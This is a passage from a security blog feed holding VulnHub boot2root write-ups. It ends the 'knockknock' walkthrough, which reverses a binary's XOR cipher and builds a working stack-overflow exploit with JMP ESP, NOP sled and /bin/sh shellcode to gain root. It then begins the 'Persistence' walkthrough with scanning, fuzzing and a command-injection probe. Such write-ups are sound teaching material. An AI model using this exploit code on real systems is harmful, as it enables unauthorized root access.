[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0xc55193b
ESP: 0xbffff3c0 (&ldquo;<em>dv(\002\250C<sup>z</sup>Ɯ=\214<code>P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\"\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"...)
EIP: 0x675c916
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x675c916
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 ("_dv(\002\250C^zƜ=\214</code>P@JH\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u</em>˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o"&hellip;)
0004| 0xbffff3c4 &mdash;> 0x5e43a802
0008| 0xbffff3c8 &mdash;> 0x3d9cc67a
0012| 0xbffff3cc &mdash;> 0x4050608c
0016| 0xbffff3d0 (&ldquo;JH\/Ux7;&lt;\243\211T<em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 &rdquo;&hellip;)
0020| 0xbffff3d4 (&ldquo;Ux7;&lt;\243\211T</em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 BG\202\006&rdquo;&hellip;)
0024| 0xbffff3d8 &mdash;> 0x5489a33c
0028| 0xbffff3dc &mdash;> 0x3997552a
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0675c916 in ?? ()
gdb-peda$
```</p>

<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img class="<a" src="href="https://i.imgur.com/VPUDXvo.png">https://i.imgur.com/VPUDXvo.png</a>"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/cT7i3ob.png">https://i.imgur.com/cT7i3ob.png</a>"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<p><code>c
int xcrypt(int arg0, int arg1) {
</code></p>

<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<p>```c</p>

<pre><code>var_C = 0xea1ab19f;
var_10 = arg_0;
var_4 = 0x0;
</code></pre>

<p>```</p>

<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<p>```c</p>

<pre><code>while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
        *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
</code></pre>

<p>```</p>

<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<p>```c</p>

<pre><code>        var_8 = 0x0;
        while (var_8 &lt;= 0x7) {
                if ((var_C &amp; 0x1) != 0x0) {
                        var_C = var_C &gt;&gt; 0x1;
                        var_C = var_C ^ 0x6daa1cf4;
                }
                else {
                        var_C = var_C &gt;&gt; 0x1;
                }
                var_8 = var_8 + 0x1;
        }
        var_4 = var_4 + 0x1;
}
</code></pre>

<p>```</p>

<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<p>```c</p>

<pre><code>var_14 = arg_4 &amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp; 0x3) &gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
        var_C = var_C &gt;&gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
</code></pre>

<p>}
```</p>

<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<h1>Hopper Pseudo Code</h1>

<h1>int xcrypt(int arg0, int arg1) {</h1>

<h1>var_C = 0xea1ab19f;</h1>

<h1>var_10 = arg_0;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while (arg_4 >> 0x2 > var_4) {</h1>

<h1><em>(var_4 * 0x4 + var_10) = </em>(var_10 + var_4 * 0x4) ^ var_C;</h1>

<h1>var_8 = 0x0;</h1>

<h1>while (var_8 &lt;= 0x7) {</h1>

<h1>if ((var_C &amp; 0x1) != 0x0) {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>var_C = var_C ^ 0x6daa1cf4;</h1>

<h1>}</h1>

<h1>else {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>}</h1>

<h1>var_8 = var_8 + 0x1;</h1>

<h1>}</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>var_14 = arg_4 &amp; 0xfffffffc;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while ((arg_4 &amp; 0x3) > var_4) {</h1>

<h1><em>(int8_t </em>)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ <em>(int8_t </em>)(arg_0 + var_14 + var_4) &amp; 0xff);</h1>

<h1>var_C = var_C >> 0x8;</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>return 0x0;</h1>

<h1>}</h1>

<p>def xcrypt(content, length):</p>

<pre><code>encrypted = ''

# set the base encryption key. this mutates with each pass
key = 0xea1ab19f    # var_C = 0xea1ab19f;

for word in range(length &gt;&gt; 2): # while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
    # apply the encryption logic as can bee seen in
    # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

    # grab the 4 bytes we working with
    bytes = content[word*4:((word*4)+4)]

    # struct unpack_from returns a tuple, we want 0 so that
    # we end up with something we can xor
    long_to_xor = struct.unpack_from('&lt;L', bytes)[0]

    # apply the xor, this is the actual encryption part
    encrypted_bytes = long_to_xor ^ key

    # append the 4 encrypted bytes by packing them
    encrypted += struct.pack('&lt;L',encrypted_bytes)

    # next we run the key mutation 
    for mutation in xrange(8):

        # no mutation is possible of the key is 1111 1111 1111 1111
        if (key &amp; 1) != 0:
            key = key &gt;&gt; 1
            key = key ^ 0x6daa1cf4
        else:
            key = key &gt;&gt; 1  

return encrypted;
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># set the content that we want to encrypt
content = "A" *1000
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<h2>testing the script</h2>

<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<p>```bash
root@kali:~# python make-crypt.py > test.tfc</p>

<p>root@kali:~# head test.tfc
��[�]��C��dl�</p>

<pre><code>          H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s&lt;A��^��
</code></pre>

<p>root@kali:~# ./tfc test.tfc out.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```</p>

<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
ESP: 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
EIP: 0x41414141 (&lsquo;AAAA&rsquo;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x41414141
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0004| 0xbffff3d4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0008| 0xbffff3d8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0012| 0xbffff3dc (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0016| 0xbffff3e0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0020| 0xbffff3e4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0024| 0xbffff3e8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0028| 0xbffff3ec (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```</p>

<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>[&hellip; snip &hellip;]</p>

<p>Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
```</p>

<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<p><code>bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
</code></p>

<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<p><code>bash
content = "A" *4124 + "BBBB" + "C"*(6000-4124-4)
</code></p>

<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img class="<a" src="href="https://i.imgur.com/Mqkfe8l.png">https://i.imgur.com/Mqkfe8l.png</a>"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<p><code>bash
content = "A" *4124 + "\x93\x8e\x04\x08" + "C"*(6000-4124-4)
</code></p>

<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<p>```python
if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># 08048e93  ; jmp esp
shellcode = (
    "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
    "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)

content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<p>```bash
jason@knockknock:~$ python make-crypt.py > crash.tfc &amp;&amp; ./tfc crash.tfc crash-out.tfc</p>

<h1>id</h1>

<p>uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
```</p>

<p>pwnd!</p>

<p>As proof, the flag:</p>

<p>```bash</p>

<h1>cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</h1>

<hr />

<p>|  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong>         |  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong> /<em>   |
|  |/ //    \ /  _ _/ </em><strong>\|  |/ /  </strong><em><strong><em> |  |/ //    \ /  _ _/ </em></strong>\|  |/ /  |   |
|    &lt;|   |  (  &lt;</em>> )  _<strong>|    &lt;  /</strong><strong><em>/ |    &lt;|   |  (  &lt;</em>> )  _</strong>|    &lt;   |   |
|<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \         |<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \  |___|</p>

<pre><code> \/    \/            \/     \/              \/    \/            \/     \/       
</code></pre>

<p>Hooray you got the flag!</p>

<p>Hope you had as much fun r00ting this as I did making it!</p>

<p>Feel free to hit me up in #vulnhub @ zer0w1re</p>

<p>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)</p>

<p>root password is &ldquo;qVx4UJ*zcUdc9#3C$Q&rdquo;, but you should already have a shell, right? ;)
```</p>

<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[From Persistence, to pain, to PWN]]></title>
    <link href="http://leonjza.github.io/blog/2014/09/18/from-persistence/"/>
    <updated>2014-09-18T06:58:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/09/18/from-persistence</id>
    <content type="html"><![CDATA[<h2>persist we must!</h2>

<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>

<p><blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote></p>

<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>

<h2>lets get our hands dirty</h2>

<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>

<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>

<p>```bash First Persistence Nmap
root@kali:~# nmap 192.168.56.104 &mdash;reason -sV -p-</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-09-18 07:01 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0037s latency).
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
```</p>

<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>

<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>

<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>

<p>```bash PHP reveal
root@kali:~# curl -v 192.168.56.104/index.php
* About to connect() to 192.168.56.104 port 80 (#0)
*   Trying 192.168.56.104&hellip;
* connected
* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)</p>

<blockquote><p>GET /index.php HTTP/1.1
User-Agent: curl/7.26.0
Host: 192.168.56.104
Accept: <em>/</em></p></blockquote>

<ul>
<li>additional stuff not fine transfer.c:1037: 0 0</li>
<li>HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 404 Not Found
&lt; Server: nginx/1.4.7
&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
&lt; Content-Type: text/html
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; X-Powered-By: PHP/5.3.3</li>
</ul>


<p>No input file specified.</p>

<ul>
<li>Connection #0 to host 192.168.56.104 left intact</li>
<li>Closing connection #0
```</li>
</ul>


<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>

<h2>finding that (de)bugger</h2>

<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>

<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>

<p>```bash discovering debug.php
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt &mdash;hc 404 <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.104/FUZZ.php">http://192.168.56.104/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>00434:  C=200     12 L        28 W      357 Ch    &ldquo; &ndash; debug&rdquo;
```</p>

<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>

<p><img class="<a" src="href="https://i.imgur.com/neKe18e.png">https://i.imgur.com/neKe18e.png</a>"></p>

<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>

<h2>blind command injection</h2>

<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>

<p><code>bash ping test
root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
